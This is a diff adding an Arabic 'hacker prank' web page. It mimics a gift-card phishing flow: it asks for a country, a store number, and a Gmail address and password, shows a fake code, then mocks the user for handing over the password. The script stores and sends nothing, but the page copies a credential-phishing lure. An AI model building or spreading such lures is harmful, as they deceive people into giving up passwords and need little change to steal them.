@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ByBokaArabic - Hacker Prank</title>
+    <style>
+        /* ستايل الهكر */
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        .container {
+            border: 2px solid #0f0;
+            padding: 20px;
+            background: rgba(0, 20, 0, 0.9);
+            box-shadow: 0 0 15px #0f0;
+            text-align: center;
+            width: 350px;
+        }
+
+        input, select, button {
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        button {
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #0f0;
+            color: #000;
+        }
+
+        .hidden { display: none; }
+
+        #final-msg {
+            font-size: 24px;
+            color: #ff0000;
+            font-weight: bold;
+        }
+        
+        .code-display {
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div id="step1" class="container">
+    <h3>ByBokaArabic</h3>
+    <label>حدد الستور الي تبيه:</label>
+    <select id="country-list">
+        <option value="">-- اختر الدولة --</option>
+        <option>السعودية</option>
+        <option>الكويت</option>
+        <option>الإمارات</option>
+        <option>مصر</option>
+        <option>أمريكا</option>
+        <option>بريطانيا</option>
+    </select>
+    
+    <label>رقم الستور الي تبيه:</label>
+    <input type="number" id="store-number" placeholder="أدخل الرقم هنا...">
+    
+    <button onclick="goToStep2()">التالي</button>
+</div>
+
+<div id="step2" class="container hidden">
+    <h3>تسجيل الدخول لاستلام الهدية</h3>
+    <p style="font-size: 12px;">سيتم إرسال الهدية عبر Gmail</p>
+    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+    <input type="password" id="pass" placeholder="كلمة المرور" required>
+    <button onclick="goToStep3()">التالي لربح الستور</button>
+</div>
+
+<div id="step3" class="container hidden">
+    <h3>جاري توليد الكود...</h3>
+    <div id="code-area" class="code-display">xxxx-xxxx-xxxx</div>
+    <button id="copy-btn" class="hidden" onclick="copyCode()">نسخ الكود</button>
+</div>
+
+<div id="step4" class="container hidden">
+    <p id="final-msg">
+        راح حسابك يا سبك 😂 <br>
+        روح غير كلمة المرور بسرعة قبل لا يروح 😅
+    </p>
+</div>
+
+<script>
+    function goToStep2() {
+        const storeNum = document.getElementById('store-number').value;
+        if(storeNum === "") {
+            alert("حط رقم الستور أول يا بطل!");
+            return;
+        }
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+    }
+
+    function goToStep3() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(email === "" || pass === "") {
+            alert("لازم تكتب البيانات عشان تربح!");
+            return;
+        }
+
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.remove('hidden');
+
+        // انتظار ثانية ثم إظهار الكود
+        setTimeout(() => {
+            const randomCode = Math.random().toString(36).toUpperCase().substring(2, 6) + "-" + 
+                               Math.random().toString(36).toUpperCase().substring(2, 6) + "-" + 
+                               Math.random().toString(36).toUpperCase().substring(2, 6);
+            document.getElementById('code-area').innerText = randomCode;
+            document.getElementById('copy-btn').classList.remove('hidden');
+        }, 1000);
+    }
+
+    function copyCode() {
+        const code = document.getElementById('code-area').innerText;
+        navigator.clipboard.writeText(code);
+        alert("تم نسخ الكود! جاري التحقق...");
+        
+        // الانتقال لرسالة الطقطقة بعد النسخ
+        setTimeout(() => {
+            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step4').classList.remove('hidden');
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
